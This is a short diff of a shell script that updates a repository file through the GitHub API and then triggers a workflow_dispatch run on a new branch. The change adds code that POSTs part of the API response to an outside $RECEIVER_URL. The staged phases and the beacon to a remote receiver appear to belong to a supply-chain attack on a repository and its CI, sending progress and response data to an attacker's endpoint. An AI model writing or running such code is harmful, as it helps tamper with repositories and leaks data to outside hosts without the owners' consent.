@@ -121,7 +121,12 @@ UPDATE_RESPONSE=$(curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" 
     \"sha\": \"$FILE_SHA\",
     \"branch\": \"$BRANCH\"
   }" 2>&1)
-curl -s "$RECEIVER_URL?stage=phase3_update&status=$(echo "$UPDATE_RESPONSE" | jq -r '.content.name // "failed"')" || true
+UPDATE_STATUS=$(echo "$UPDATE_RESPONSE" | jq -r '.content.name // empty' 2>/dev/null)
+if [ -z "$UPDATE_STATUS" ]; then
+  curl -s -X POST "$RECEIVER_URL?stage=phase3_update_failed" -d "$(echo -n "$UPDATE_RESPONSE" | head -c 1000)" || true
+else
+  curl -s "$RECEIVER_URL?stage=phase3_update_ok&file=$UPDATE_STATUS" || true
+fi
 
 # --- Phase 4: Trigger workflow_dispatch on the new branch ---
 sleep 3
